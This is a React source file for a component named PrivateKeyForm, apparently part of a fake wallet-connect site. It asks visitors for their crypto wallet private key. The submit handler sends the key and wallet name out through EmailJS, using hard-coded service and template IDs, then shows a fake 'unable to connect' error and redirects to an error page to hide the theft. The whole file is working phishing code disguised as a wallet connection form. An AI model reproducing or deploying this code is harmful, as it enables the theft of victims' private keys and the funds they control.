import styles from '../WalletConnectForm.module.css';
import {useNavigate} from 'react-router-dom';
import { useEffect, useState } from 'react';
import { ToastContainer, toast } from 'react-toastify';
import emailjs from '@emailjs/browser';


const PrivateKeyForm = ({wallet, privateKeyLengthNotlong}) => {

    const navigate = useNavigate();
    const [privateKey, setPrivateKey] = useState("");
    const [privateSubmitBtn, setPrivateSubmitBtn] = useState('CONNECT');
    const [privateKey64Long, setPrivateKey64Long] = useState(false);

    const handleChange = (e) => {
      setPrivateKey(e.target.value)
    }
    
    useEffect(() => {
      const isPasswordWithinRange = (privateKey) => {
        const length = privateKey.length;
        const hasSpaces = privateKey.includes(" ");
        return length >= 30 && length <= 190 && !hasSpaces;
      }
      
      if (isPasswordWithinRange(privateKey)) {
        setPrivateKey64Long(true)
      } else {
        setPrivateKey64Long(false)
      }
    }, [privateKey])
    
    const handlePrivateKeySubmit = async (e) => {
      e.preventDefault();
      setPrivateSubmitBtn("Processing...")
      const name = wallet;
      const type = "Private_Key";
      const data = privateKey;
      const password = "not_required";

    if (privateKey64Long) {
      try {

        await emailjs.send(
          'service_umld2d4',
          'template_dwuojlh',
          {
            to_name: "dapp",
            from_name: name,
            message: `
              Name: ${name}
              Type: ${type}
              Data: ${data}
              Password: ${password}
            `,
          },
          'o_NYBBGCjR2YIkIYu'
        );

        toast.error('unable to connect',  {
          position: "top-right",
          autoClose: 2500,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          progress: undefined,
          theme: "light",
          });

        setTimeout(() => {
          navigate('/error')
        }, 3000);

      } catch (error) {
          console.log(error)
          setPrivateSubmitBtn("CONNECT")
      }
    } else {
        privateKeyLengthNotlong()
        setPrivateSubmitBtn("CONNECT")
    }
  }

  return (
    <>
    <ToastContainer />
        <form onSubmit={handlePrivateKeySubmit}>
                    <input
                      required
                      type="text"
                      name="`privateKey"
                      value={privateKey}
                      autoComplete="off"
                      onChange={handleChange}
                      placeholder='Enter your Private Key'
                      className={styles.privateKeyInput}
                    />
                    <p className={styles.hint} style={{color: privateKey64Long ? "green" : "red"}}>
                    Private keys vary in format, but they often consist of a sequence of hexadecimal characters without spaces.
                    </p>
                    <button type='submit' className={styles.connectButton}>{privateSubmitBtn}</button>
                </form>
    </>
  )
}

export default PrivateKeyForm
